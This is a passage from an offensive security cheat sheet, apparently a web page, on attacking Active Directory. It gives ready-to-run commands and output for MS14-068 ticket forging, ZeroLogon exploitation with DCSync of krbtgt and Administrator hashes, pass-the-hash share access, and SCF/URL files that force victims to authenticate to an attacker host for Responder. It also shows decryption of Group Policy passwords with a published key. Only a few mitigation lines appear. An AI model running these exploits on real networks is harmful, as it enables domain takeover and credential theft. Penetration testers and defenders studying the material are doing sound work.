</pre></td><td class="rouge-code"><pre><span class="c"># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/SecWiki/windows-kernel-exploits</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">.</span><span class="nx">/ms14-068.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">userName</span><span class="err">&gt;@&lt;</span><span class="nx">domainName</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">userSid</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domainControlerAddr</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">clearPassword</span><span class="err">&gt;</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">.</span><span class="nx">/ms14-068.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">darthsidious</span><span class="err">@</span><span class="nx">lab.adsecurity.org</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">TheEmperor99</span><span class="o">!</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">S-1-5-21-1473643419-774954089-2222329127-1110</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">adsdc02.lab.adsecurity.org</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">.</span><span class="nx">/ms14-068.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">john.smith</span><span class="err">@</span><span class="nx">pwn3d.local</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">S-1-5-21-2923581646-3335815371-2872905324-1107</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">192.168.115.10</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">ms14-068.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user01</span><span class="err">@</span><span class="nx">metasploitable.local</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">Password1</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">S-1-5-21-2928836948-3642677517-2073454066</span><span class="w">
</span><span class="nt">-1105</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="nx">AS-REQ</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="nx">AS-REQ</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Receiving</span><span class="w"> </span><span class="nx">AS-REP</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Parsing</span><span class="w"> </span><span class="nx">AS-REP</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="nx">TGS-REQ</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="nx">TGS-REQ</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Receiving</span><span class="w"> </span><span class="nx">TGS-REP</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Parsing</span><span class="w"> </span><span class="nx">TGS-REP</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">msfdc01.metasploitable.local...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Creating</span><span class="w"> </span><span class="nx">ccache</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="s1">'TGT_user01@metasploitable.local.ccache'</span><span class="o">...</span><span class="w"> </span><span class="nx">Done</span><span class="o">!</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Then use <code class="language-plaintext highlighter-rouge">mimikatz</code> to load the ticket.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">mimikatz.exe</span><span class="w"> </span><span class="s2">"kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>:warning: If the clock is skewed use <code class="language-plaintext highlighter-rouge">clock-skew.nse</code> script from <code class="language-plaintext highlighter-rouge">nmap</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">Linux</span><span class="err">&gt;</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="nt">-sV</span><span class="w"> </span><span class="nt">-sC</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w">
</span><span class="n">clock-skew:</span><span class="w"> </span><span class="nx">mean:</span><span class="w"> </span><span class="nt">-1998d09h03m04s</span><span class="p">,</span><span class="w"> </span><span class="nx">deviation:</span><span class="w"> </span><span class="nx">4h00m00s</span><span class="p">,</span><span class="w"> </span><span class="nx">median:</span><span class="w"> </span><span class="nt">-1998d11h03m05s</span><span class="w">

</span><span class="n">Linux</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sudo</span><span class="w"> </span><span class="nx">date</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="s2">"14 APR 2015 18:25:16"</span><span class="w"> 
</span><span class="n">Windows</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">time</span><span class="w"> </span><span class="nx">/domain</span><span class="w"> </span><span class="nx">/set</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="mitigations">Mitigations</h4>

<ul>
  <li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li>
</ul>

<h3 id="cve-2020-1472-zerologon">CVE-2020-1472 ZeroLogon</h3>

<p>White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055</p>

<p>Exploit steps from the white paper</p>

<ol>
  <li>Spoofing the client credential</li>
  <li>Disabling signing and sealing</li>
  <li>Spoofing a call</li>
  <li>Changing a computer’s AD password to null</li>
  <li>From password change to domain admin</li>
  <li>:warning: reset the computer’s AD password in a proper way to avoid any Deny of Service</li>
</ol>

<ul>
  <li><code class="language-plaintext highlighter-rouge">cve-2020-1472-exploit.py</code> - Python script from dirkjanm
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/dirkjanm/CVE-2020-1472.git</span><span class="w">

</span><span class="c"># Activate a virtual env to install impacket</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">venv</span><span class="w"> </span><span class="nx">venv</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="nx">venv/bin/activate</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">pip3</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="o">.</span><span class="w">

</span><span class="c"># Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)</span><span class="w">
</span><span class="n">proxychains</span><span class="w"> </span><span class="nx">python3</span><span class="w"> </span><span class="nx">cve-2020-1472-exploit.py</span><span class="w"> </span><span class="nx">DC01</span><span class="w"> </span><span class="nx">172.16.1.5</span><span class="w">

</span><span class="c"># Find the old NT hash of the DC</span><span class="w">
</span><span class="n">proxychains</span><span class="w"> </span><span class="nx">secretsdump.py</span><span class="w"> </span><span class="nt">-history</span><span class="w"> </span><span class="nt">-just-dc-user</span><span class="w"> </span><span class="s1">'DC01$'</span><span class="w"> </span><span class="nt">-hashes</span><span class="w"> </span><span class="p">:</span><span class="nx">31d6cfe0d16ae931b73c59d7e0c089c0</span><span class="w"> </span><span class="s1">'CORP/DC01$@DC01.CORP.LOCAL'</span><span class="w">

</span><span class="c"># Restore password from secretsdump </span><span class="w">
</span><span class="c"># secretsdump will automatically dump the plaintext machine password (hex encoded) </span><span class="w">
</span><span class="c"># when dumping the local registry secrets on the newest version</span><span class="w">
</span><span class="n">python</span><span class="w"> </span><span class="nx">restorepassword.py</span><span class="w"> </span><span class="nx">CORP/DC01</span><span class="err">@</span><span class="nx">DC01.CORP.LOCAL</span><span class="w"> </span><span class="nt">-target-ip</span><span class="w"> </span><span class="nx">172.16.1.5</span><span class="w"> </span><span class="nt">-hexpass</span><span class="w"> </span><span class="nx">e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3</span><span class="w">
</span><span class="n">deactivate</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><code class="language-plaintext highlighter-rouge">nccfsas</code> - .NET binary for Cobalt Strike’s execute-assembly
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/nccgroup/nccfsas</span><span class="w">
</span><span class="c"># Check</span><span class="w">
</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">SharpZeroLogon.exe</span><span class="w"> </span><span class="nx">win-dc01.vulncorp.local</span><span class="w">

</span><span class="c"># Resetting the machine account password</span><span class="w">
</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">SharpZeroLogon.exe</span><span class="w"> </span><span class="nx">win-dc01.vulncorp.local</span><span class="w"> </span><span class="nt">-reset</span><span class="w">

</span><span class="c"># Testing from a non Domain-joined machine</span><span class="w">
</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">SharpZeroLogon.exe</span><span class="w"> </span><span class="nx">win-dc01.vulncorp.local</span><span class="w"> </span><span class="nt">-patch</span><span class="w">

</span><span class="c"># Now reset the password back</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><code class="language-plaintext highlighter-rouge">Mimikatz</code> - 2.2.0 20200917 Post-Zerologon
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="n">privilege::debug</span><span class="w">
</span><span class="c"># Check for the CVE</span><span class="w">
</span><span class="n">lsadump::zerologon</span><span class="w"> </span><span class="nx">/target:DC01.LAB.LOCAL</span><span class="w"> </span><span class="nx">/account:DC01</span><span class="err">$</span><span class="w">

</span><span class="c"># Exploit the CVE and set the computer account's password to ""</span><span class="w">
</span><span class="n">lsadump::zerologon</span><span class="w"> </span><span class="nx">/target:DC01.LAB.LOCAL</span><span class="w"> </span><span class="nx">/account:DC01</span><span class="err">$</span><span class="w"> </span><span class="nx">/exploit</span><span class="w">

</span><span class="c"># Execute dcsync to extract some hashes</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/domain:LAB.LOCAL</span><span class="w"> </span><span class="nx">/dc:DC01.LAB.LOCAL</span><span class="w"> </span><span class="nx">/user:krbtgt</span><span class="w"> </span><span class="nx">/authuser:DC01</span><span class="err">$</span><span class="w"> </span><span class="nx">/authdomain:LAB</span><span class="w"> </span><span class="nx">/authpassword:</span><span class="s2">""</span><span class="w"> </span><span class="nx">/authntlm</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/domain:LAB.LOCAL</span><span class="w"> </span><span class="nx">/dc:DC01.LAB.LOCAL</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/authuser:DC01</span><span class="err">$</span><span class="w"> </span><span class="nx">/authdomain:LAB</span><span class="w"> </span><span class="nx">/authpassword:</span><span class="s2">""</span><span class="w"> </span><span class="nx">/authntlm</span><span class="w">

</span><span class="c"># Pass The Hash with the extracted Domain Admin hash</span><span class="w">
</span><span class="n">sekurlsa::pth</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/domain:LAB</span><span class="w"> </span><span class="nx">/rc4:HASH_NTLM_ADMIN</span><span class="w">

</span><span class="c"># Use IP address instead of FQDN to force NTLM with Windows APIs </span><span class="w">
</span><span class="c"># Reset password to Waza1234/Waza1234/Waza1234/</span><span class="w">
</span><span class="c"># https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584</span><span class="w">
</span><span class="n">lsadump::postzerologon</span><span class="w"> </span><span class="nx">/target:10.10.10.10</span><span class="w"> </span><span class="nx">/account:DC01</span><span class="err">$</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h3 id="open-shares">Open Shares</h3>

<ul>
  <li><a href="https://github.com/ShawnDEvans/smbmap">smbmap</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">smbmap</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w">                </span><span class="c"># null session</span><span class="w">
</span><span class="n">smbmap</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-R</span><span class="w">             </span><span class="c"># recursive listing</span><span class="w">
</span><span class="n">smbmap</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">invaliduser</span><span class="w"> </span><span class="c"># guest smb session</span><span class="w">
</span><span class="n">smbmap</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s2">"DOMAIN.LOCAL"</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"USERNAME"</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">"Password123*"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/byt3bl33d3r/pth-toolkit">pth-smbclient from path-toolkit</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">pth-smbclient</span><span class="w"> </span><span class="nt">-U</span><span class="w"> </span><span class="s2">"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A"</span><span class="w"> </span><span class="nx">//192.168.10.100/Share</span><span class="w">
</span><span class="n">pth-smbclient</span><span class="w"> </span><span class="nt">-U</span><span class="w"> </span><span class="s2">"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A"</span><span class="w"> </span><span class="nx">//192.168.10.100/C</span><span class="err">$</span><span class="w">
</span><span class="n">ls</span><span class="w">  </span><span class="c"># list files</span><span class="w">
</span><span class="n">cd</span><span class="w">  </span><span class="c"># move inside a folder</span><span class="w">
</span><span class="n">get</span><span class="w"> </span><span class="c"># download files</span><span class="w">
</span><span class="n">put</span><span class="w"> </span><span class="c"># replace a file</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/SecureAuthCorp/impacket">smbclient from Impacket</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="n">smbclient</span><span class="w"> </span><span class="nt">-I</span><span class="w"> </span><span class="nx">10.10.10.100</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="nx">ACTIVE</span><span class="w"> </span><span class="nt">-N</span><span class="w"> </span><span class="nt">-U</span><span class="w"> </span><span class="s2">""</span><span class="w">
        </span><span class="n">Sharename</span><span class="w">       </span><span class="nx">Type</span><span class="w">      </span><span class="nx">Comment</span><span class="w">
        </span><span class="o">---------</span><span class="w">       </span><span class="o">----</span><span class="w">      </span><span class="o">-------</span><span class="w">
        </span><span class="n">ADMIN</span><span class="err">$</span><span class="w">          </span><span class="nx">Disk</span><span class="w">      </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">Admin</span><span class="w">
        </span><span class="n">C</span><span class="err">$</span><span class="w">              </span><span class="nx">Disk</span><span class="w">      </span><span class="nx">Default</span><span class="w"> </span><span class="nx">share</span><span class="w">
        </span><span class="n">IPC</span><span class="err">$</span><span class="w">            </span><span class="nx">IPC</span><span class="w">       </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">IPC</span><span class="w">
        </span><span class="n">NETLOGON</span><span class="w">        </span><span class="nx">Disk</span><span class="w">      </span><span class="nx">Logon</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">share</span><span class="w">
        </span><span class="n">Replication</span><span class="w">     </span><span class="nx">Disk</span><span class="w">      
        </span><span class="n">SYSVOL</span><span class="w">          </span><span class="nx">Disk</span><span class="w">      </span><span class="nx">Logon</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">share</span><span class="w">
        </span><span class="n">Users</span><span class="w">           </span><span class="nx">Disk</span><span class="w">
</span><span class="n">use</span><span class="w"> </span><span class="nx">Sharename</span><span class="w"> </span><span class="c"># select a Sharename</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">Folder</span><span class="w">     </span><span class="c"># move inside a folder</span><span class="w">
</span><span class="n">ls</span><span class="w">            </span><span class="c"># list files</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="#">smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">smbclient</span><span class="w"> </span><span class="nt">-U</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nx">//10.0.0.1/SYSVOL</span><span class="w">
</span><span class="n">smbclient</span><span class="w"> </span><span class="nx">//10.0.0.1/Share</span><span class="w">

</span><span class="c"># Download a folder recursively</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mask</span><span class="w"> </span><span class="s2">""</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">recurse</span><span class="w"> </span><span class="nx">ON</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">prompt</span><span class="w"> </span><span class="nx">OFF</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lcd</span><span class="w"> </span><span class="s1">'/path/to/go/'</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mget</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h3 id="scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</h3>

<p>Drop the following <code class="language-plaintext highlighter-rouge">@something.scf</code> file inside a share and start listening with Responder : <code class="language-plaintext highlighter-rouge">responder -wrf --lm -v -I eth0</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="n">Shell</span><span class="p">]</span><span class="w">
</span><span class="kr">Command</span><span class="o">=</span><span class="mi">2</span><span class="w">
</span><span class="n">IconFile</span><span class="o">=</span><span class="n">\\10.10.10.10\Share\test.ico</span><span class="w">
</span><span class="p">[</span><span class="n">Taskbar</span><span class="p">]</span><span class="w">
</span><span class="kr">Command</span><span class="o">=</span><span class="n">ToggleDesktop</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>This attack also works with <code class="language-plaintext highlighter-rouge">.url</code> files and <code class="language-plaintext highlighter-rouge">responder -I eth0 -v</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="n">InternetShortcut</span><span class="p">]</span><span class="w">
</span><span class="n">URL</span><span class="o">=</span><span class="n">whatever</span><span class="w">
</span><span class="nx">WorkingDirectory</span><span class="o">=</span><span class="n">whatever</span><span class="w">
</span><span class="nx">IconFile</span><span class="o">=</span><span class="n">\\10.10.10.10\</span><span class="o">%</span><span class="nx">USERNAME</span><span class="o">%.</span><span class="nf">icon</span><span class="w">
</span><span class="nx">IconIndex</span><span class="o">=</span><span class="mi">1</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="passwords-in-sysvol--group-policy-preferences">Passwords in SYSVOL &amp; Group Policy Preferences</h3>

<p>Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: <code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">findstr</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/I</span><span class="w"> </span><span class="nx">cpassword</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">FQDN</span><span class="err">&gt;</span><span class="nx">\sysvol\</span><span class="err">&lt;</span><span class="nx">FQDN</span><span class="err">&gt;</span><span class="nx">\policies\</span><span class="o">*.</span><span class="nf">xml</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Decrypt a Group Policy Password found in SYSVOL (by <a href="https://twitter.com/0x00C651E0/status/956362334682849280">0x00C651E0</a>), using the 32-byte AES key provided by Microsoft in the <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">MSDN - 2.2.1.1.4 Password Encryption</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'password_in_base64'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | openssl enc <span class="nt">-d</span> <span class="nt">-aes-256-cbc</span> <span class="nt">-K</span> 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b <span class="nt">-iv</span> 0000000000000000

e.g: 
<span class="nb">echo</span> <span class="s1">'5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso='</span> | <span class="nb">base64</span> <span class="nt">-d</span> | openssl enc <span class="nt">-d</span> <span class="nt">-aes-256-cbc</span> <span class="nt">-K</span> 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b <span class="nt">-iv</span> 0000000000000000

<span class="nb">echo</span> <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | openssl enc <span class="nt">-d</span> <span class="nt">-aes-256-cbc</span> <span class="nt">-K</span> 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b <span class="nt">-iv</span> 0000000000000000
</pre></td></tr></tbody></table></code></div></div>

<h4 id="automate-the-sysvol-and-passwords-research">Automate the SYSVOL and passwords research</h4>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Metasploit</code> modules to enumerate shares and credentials
    <div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>  <span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_enumshares</span>
  <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_shares</span>
  <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">credentials</span><span class="o">/</span><span class="n">gpp</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>CrackMapExec modules
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">89</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="nx">9d</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">gpp_autologin</span><span class="w">
  </span><span class="n">cme</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">89</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="nx">9d</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">gpp_password</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/ShutdownRepo/Get-GPPPassword">Get-GPPPassword</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c"># with a NULL session</span><span class="w">
</span><span class="n">Get-GPPPassword.py</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w"> </span><span class="s1">'DOMAIN_CONTROLLER'</span><span class="w">

</span><span class="c"># with cleartext credentials</span><span class="w">
</span><span class="n">Get-GPPPassword.py</span><span class="w"> </span><span class="s1">'DOMAIN'</span><span class="nx">/</span><span class="s1">'USER'</span><span class="p">:</span><span class="s1">'PASSWORD'</span><span class="sh">@'DOMAIN_CONTROLLER'

# pass-the-hash
Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@</span><span class="s1">'DOMAIN_CONTROLLER'</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h4 id="mitigations-1">Mitigations</h4>

<ul>
